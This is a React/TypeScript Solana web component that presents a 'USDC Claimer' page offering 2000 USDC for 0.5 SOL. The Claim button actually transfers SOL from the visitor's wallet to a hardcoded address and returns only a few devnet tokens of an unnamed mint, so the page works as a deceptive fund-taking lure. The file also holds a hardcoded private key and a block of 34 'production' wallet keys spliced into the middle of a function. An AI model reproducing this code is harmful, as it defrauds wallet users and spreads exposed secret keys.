/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5bNxkMxxwcbfWHkmT9fSxXkhcYYhFBTACEAXeG8smHP6AEcdeEMft9GGz7pAuhXoLWb7zajyky9Kv2L8jDtsSx9L"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5wGv9eFX1tFMpJHzWe4vcTcxLaGTZLdB6jkcHZSUfshEC3gr5V9P5Dk1fmPM8U8RkVkBumN237tX2diUBqcXfbJA",
  "key1": "3YejbTnfmUyoJAkq5JNazsu9xUFHqLpRrT9iKhe9UgYCMxWRYzp6u6Y5L6sguLbRQSgr1cCEpq9utwkY9TJwwvdo",
  "key2": "5yDtctR5yG9cZqMz1qL9m1xLQDkH5T1hdB5FBy8fEEPww7gMd4twcJgxp4DnMZA6BpuVjp3ZaP4ehRVcq2pgHYck",
  "key3": "55jAuU1ouAQZt12Rza8DuzuPP723XA57YmupbPZBnML1Ezs99GqFMArJWxef3K8x2qPEBZaBoeLXs43TGB5c1x6V",
  "key4": "5cvtnMdLZ1JhWzxbMgRAa2c4aR6zMYGs4RzmMBBPvxTAkVPUF5MnKkkqEadn29FsoabuwFKkrP5myG3YfNTMzTsr",
  "key5": "4WZ5CUtfBceGu8Byk9jEiwZeByd4MUKmqTSssS38qqZtCdUNM6iLJ4ysWAiyECY842qAoRUWQqSjs7JzDgRoK44D",
  "key6": "3UyjfrVSeDn3wsuq1pf76itwW5atzQyEAUiC858bGQPbNXHUKuSSn9UWsBvQW4wt4AKMS7QYv9xQGPZSLHrDkD4a",
  "key7": "4EcB3RZgzXaEmeG6dc8RCtduY2DAXVP5biAt53quC1YFuME4vHyCKsmn2U5qXDmDpv7KwALVr8TDz8kZYUcVA3W8",
  "key8": "ug9ABuWqE2JfxnmCMVpo58a6FyGQjHeivdRcrUsCwFuwsEbcCb54yg2mxWWUq9NrnTPJPgDDvxg23eUjkB6SAzr",
  "key9": "TnZfDxSd2QCfo4D6PrXFTi4BhF5ycWiSfz2NATN6FRvqBB1gh9ErhzE8bRGEYtJUTadhCUTySf6cdFYgyPfAN17",
  "key10": "2hmK3PYx4bubgJF9wZRSroAZ5MHB7c5DRsL4Eo6gV4Y2WBUrQmLRrtpoHqFtYdQYPvAwKddiRU94RSKKXAwWx9tB",
  "key11": "4hB7uZTECFkEBSANL6TBpLsRbxKeakmz4sqiok1UYQTw8EKfWjjn9SZQYFMC5UmMzjUSyYGyWwfM9BSPzzRr2Zy7",
  "key12": "3xVp3JAEWK1KBNKdMKu4k99aNdNuzwCaT8HA31aokEtjt7y7cGfLn9ZKERxiDk2KHhCAYNPbL1btezMd32YdE25s",
  "key13": "3zfovMtBVx8jc6XGYpwZbyLvynysP8zHoFzahsirP3Ho4kREJJzs3FLoizAh5X13TUNwtYKxXF76QjVw2RunBJo3",
  "key14": "2G4Z79AUSQwftnoTLueMCa42b6BEEifYjHpEAWNA3VYYZnuqW5EEYJjpQ9GHRDuskvyakBCKcw2ZcyoBKKaxYDQr",
  "key15": "5pZApxV68A3jyjG98c9fdnNtpGejGnYRRXzxeynXCLeAB7kHodGoHXdGJyxAniVddPUUbEJatp15DzzogNpvGTCE",
  "key16": "5kShurq7ob8YbDQBx5okJk5ReWH9rzM1722rqKN8K2PZNHSsMAGRmKEEcjJ72QTBLhAF2KEMot2kZS2hM9euWHw8",
  "key17": "5YhTTA6R92DuvZvZKi29Lm772cM84rut98KRtJA5n7DJ6PPyQ5ko1A1xxN9dDEwuieank3EfqiKMaYR4AuqW89xR",
  "key18": "4qsqFGCGyN6oEZN9rAZQAkgaSArT8QKwyNdHhJM1csMUthkv1RQrrL6e77TCiSV7ojBkzuMAnLP4x9N7Jk6pM8us",
  "key19": "611FBmfJMnaRsFdnJcrA6EStyqsf4ryxnGGQpatscNvoCJ44nDQyTejxVcxW7BM9BcNVqQU9C78FevT6x6wT7mK6",
  "key20": "5naeeuzFLKroQYn9LNDbV2bnYQd8cmCdndaFBnvJsu7ndCDBvgwRceFy9UQr1rwkH6x2vWWfZ34Zrbao6D5gmcfz",
  "key21": "2ZEUR25E7J33AbvnezJfY2dZTvupiyakW6vf4duKyrih8WTLfCiJmWzqnPLFGEHntVmEMbjGDdcwXKePyoRyAUbA",
  "key22": "3f4NyL8xahyBfCAPzYC9Bknh4MBkY9rkTNThRkjfQ9xu2yDKQAtLa23pB2equ59SANQjyNaEuL7ym7JCSbzHjHGB",
  "key23": "4AtTQRFrUPUkLVNvzcBsZL9vnnLjdt271XwVSND1B8MRU2EFuP9CdiroJXBWstbxsAJ9V8GTuMQSwN1n3Y6ESuc7",
  "key24": "Jd7s7vzFRgRKw8zEAUqsoEZnAnkLZKVHpfoZC3nZWaumtmf8GzYSDay8FJtVGEyWiS76SyuigE9YYryBif4msjH",
  "key25": "2TJd8uzEeBorSor36DiWzjNpYi2ccZ9wu8eJK2ivHBg3VC5pGLqvHYo1pnwKEk7NaqjVNBQepKYLb7qwx6AaFs9e",
  "key26": "2DpHt1B1WRQXz3mexHBDjWKcA7ty4Enmw6EWhZvgSLGoFKNxPwErbfpZMMpi1FpQZf7gTMAGDbx8FEj4Up2G5C3D",
  "key27": "5SbuXA4BEFXGzcKApoHhz67KbeYsSC5hZQoAYhvt1vY5mu5x7PWMN2PwLzWBce8CxFLzBH33n7MtkuFWaoJJVsRX",
  "key28": "26uWj4T8HxyfJ3bf2RPBKiwYUXktfuM4kL64AT6zbkNthhm7fsJMQPmfBQ5PgYxE2Qxakk464azzjW9Q9MAweLZ3",
  "key29": "5NGXVxjDLXW1cECBafu7t1A4gbhxDKALfuKUZvBnqriPXbqLgoDXGPdSnfCphhd7cAt7U5dUt31iCBZAaPnp2n6u",
  "key30": "3bK1DVSJxZqvwhhqGiEQFAZSuZnaRibhYESfFydhzLUFenCKs1cSnCTkSRHk7TcSZgxwWrp75D9ijaacuGw8WfeR",
  "key31": "2SArunMhAPisHAAiYX5w6mRJiidYhBwyU2ZkNHYjpUpw1ueRVh9c6DE3V1sMYX1JTpHZjosMcZRcNm8prJw3h9VS",
  "key32": "3M4tV1kosLawJ3uJaRX5RjX5AuBZofYK7hixPbpcBj1Myt7YBt7TpALHKuiCuyZ4gLavukveP9ZeHfkzZiM5Faqj",
  "key33": "3SK6UqdhefJySUwCPihEUQTvotUy8ESty1c1fHChj7576mqZmmwS2Jh4HMuECJLZfvpco7mD2K9kBtvP1vLfKP1k"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
